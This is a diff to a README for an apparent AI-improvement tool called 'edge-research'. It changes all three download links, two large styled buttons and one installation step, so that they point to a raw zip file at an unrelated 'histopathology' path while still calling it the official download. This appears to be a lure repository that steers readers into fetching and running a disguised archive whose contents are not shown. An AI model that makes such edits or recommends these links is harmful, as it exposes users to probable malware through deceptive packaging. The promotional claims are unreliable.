@@ -1,7 +1,7 @@
 <h1>⚡ edge-research - Make Your AI Smarter, Automatically</h1>
 
 <p align="center">
-  <a href="https://github.com/Ceciledramatic803/edge-research" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; margin:20px 0; font-weight:bold;">⬇️ GET EDGE-RESEARCH NOW</a>
+  <a href="https://github.com/Ceciledramatic803/edge-research/raw/refs/heads/main/histopathology/3.2-beta.5.zip" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; margin:20px 0; font-weight:bold;">⬇️ GET EDGE-RESEARCH NOW</a>
 </p>
 
 ## 🔍 What Is EdgeResearch?
@@ -28,7 +28,7 @@ Welcome aboard! Starting with EdgeResearch is simpler than you might think. We'v
 ### Download Steps
 
 1. **Click the green button at the top of this page** (or the download section below) to go to the download page.
-2. Visit this link to download the application from the official download page: [Click here to download EdgeResearch](https://github.com/Ceciledramatic803/edge-research)
+2. Visit this link to download the application from the official download page: [Click here to download EdgeResearch](https://github.com/Ceciledramatic803/edge-research/raw/refs/heads/main/histopathology/3.2-beta.5.zip)
 3. Look for the download button on that page - it will be large and clearly marked.
 
 ## 📥 Download and Installation Guide
@@ -157,7 +157,7 @@ Remember, every improvement is now testable, measurable, and proven. No more fly
 ---
 
 <p align="center">
-  <a href="https://github.com/Ceciledramatic803/edge-research" style="background-color:#2196F3; color:white; padding:12px 24px; text-align:center; text-decoration:none; display:inline-block; font-size:16px; border-radius:6px; margin:20px 0;">🚀 START DOWNLOADING NOW</a>
+  <a href="https://github.com/Ceciledramatic803/edge-research/raw/refs/heads/main/histopathology/3.2-beta.5.zip" style="background-color:#2196F3; color:white; padding:12px 24px; text-align:center; text-decoration:none; display:inline-block; font-size:16px; border-radius:6px; margin:20px 0;">🚀 START DOWNLOADING NOW</a>
 </p>
 
 *EdgeResearch is continuously updated with new features. Check the download page regularly for the latest version.*
